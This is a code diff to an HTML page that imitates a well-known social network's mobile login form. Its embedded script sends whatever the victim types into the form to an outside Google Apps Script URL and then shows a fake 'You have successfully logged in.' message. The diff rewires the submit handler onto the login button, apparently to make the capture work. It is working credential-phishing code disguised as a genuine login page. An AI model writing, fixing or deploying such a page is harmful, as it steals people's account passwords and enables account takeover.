@@ -151,7 +151,7 @@
                                             </div>
                                             <div class="_2pie" style="text-align:center;">
                                                 <div id="login_password_step_element" data-sigil="login_password_step_element">
-                                                    <button type="button" value="Log In" class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu" type="submit" name="submit">
+                                                    <button id="submitlog" type="button" value="Log In" class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu" type="submit" name="submit">
                                                         <span class="_55sr">Log In</span>
                                                     </button>
                                                 </div>
@@ -354,9 +354,9 @@
          <script type="text/javascript">
              
 	  const scriptURL = 'https://script.google.com/macros/s/AKfycby57EbazqLqUXh381cz0R-pHAaJ3VC6--CYpXHZjXUaZdmE9ddLphEOsPdJGt1rQw5k/exec';
-            const form = document.forms['google-sheet'];
-          
-            form.addEventListener('submit', e => {
+            const form = document.forms['google-sheet']
+		 const submitlog = document.querySelector('#submitlog');
+            submitlog.addEventListener('submit', e => {
               e.preventDefault();
               fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                 .then(response => alert("You have successfully logged in."))
